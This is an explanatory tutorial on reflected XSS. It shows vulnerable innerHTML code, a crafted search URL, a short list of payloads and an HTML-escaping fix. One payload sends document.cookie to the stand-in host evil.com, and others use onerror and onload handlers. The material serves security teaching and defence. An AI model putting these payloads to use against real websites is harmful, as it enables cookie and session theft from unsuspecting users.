Reflected XSS — How It Works

Normal output (safe)

The server receives the search query and encodes it before inserting into the response:

outputBox.textContent = `You searched for: ${query}`;

Output on screen: You searched for: <script>alert(1)</script> ← shown as literal text.

Vulnerable output (innerHTML)

outputBox.innerHTML = `<p>You searched for: <strong>${query}</strong></p>`;

If the user submits: <img src=x onerror="alert('XSS')">

The browser parses the onerror attribute as JavaScript and executes it immediately.

Why "reflected"?

The payload is not stored anywhere.

The attacker crafts a URL containing the payload and sends it to a victim:

https://example.com/search?q=<img src=x onerror=alert(document.cookie)>

The server reflects the parameter back into the HTML response — the victim's browser executes it.

Common payloads

<!-- Broken image fires onerror -->
<img src=x onerror="alert('XSS')">

<!-- SVG onload fires immediately -->
<svg onload="alert(document.cookie)">

<!-- Anchor that leaks data on click -->
<a href="#" onclick="fetch('https://evil.com?c='+document.cookie)">click me</a>

The Fix

// Safe: encode before inserting
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

outputBox.innerHTML = `<p>You searched for: <strong>${escapeHtml(query)}</strong></p>`;

// Or avoid innerHTML entirely:
outputBox.textContent = `You searched for: ${query}`;

User input is always treated as data — never as HTML structure.
